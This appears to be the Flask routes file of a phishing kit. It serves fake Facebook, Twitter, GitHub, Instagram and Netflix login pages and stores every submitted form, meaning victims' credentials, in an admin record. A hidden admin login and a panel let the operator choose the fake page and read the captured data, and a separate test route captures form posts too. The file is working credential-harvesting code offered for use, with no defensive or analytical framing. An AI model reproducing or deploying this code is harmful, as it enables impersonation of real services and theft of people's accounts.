from flask import render_template, request, redirect,flash
from flask_login import current_user, login_user, login_required, logout_user

from YAF import app, db, config
from YAF.models import User
from YAF.forms import PanelForm

import pprint

FAKE_PAGES = {
    'fb' : 'pages/facebook.html',
    'tw' : 'pages/twitter.html',
    'gh' : 'pages/github.html',
    'insta' : 'pages/instagram.html',
    'nf' : 'pages/netflix.html',
}


@app.route('/', methods=['GET', 'POST'])
def main():
    admin = User.query.filter_by(username=config.get('admin', 'username')).first()
    if request.method == 'POST':
        admin.records = pprint.pformat(request.form, indent=4)   
        db.session.commit()

    return render_template(FAKE_PAGES.get(admin.current_page, 'boot.html'), admin_url=config.get('admin', 'admin_route'))

@app.route(config.get('admin', 'admin_route'), methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = User.query.filter_by(username=request.form.get('username')).first()
        if user and user.password == request.form.get('password'):
            login_user(user)
            return redirect('panel')
        else:
            return redirect('/')
    return render_template('admin/login.html')

@app.route('/panel', methods=['GET', 'POST'])
@login_required
def panel():
    form = PanelForm()
    if request.method == 'POST':
        current_user.current_page = form.page.data
        db.session.commit()
        flash(f'Sayfa güncellendi !', 'success')
        return redirect('/panel')
    return render_template('admin/panel.html', form=form, records=current_user.records[::-1])

@app.route(config.get('admin', 'admin_logout'))
def logout():
    if current_user.is_authenticated:
        logout_user()
    return redirect('/')
    

@app.route('/test', methods=['GET', 'POST'])
def test():
    if request.method == 'POST':
        admin = User.query.filter_by(username=config.get('admin', 'username')).first()
        admin.records = pprint.pformat(request.form, indent=4)
        db.session.commit()


    return render_template('test.html')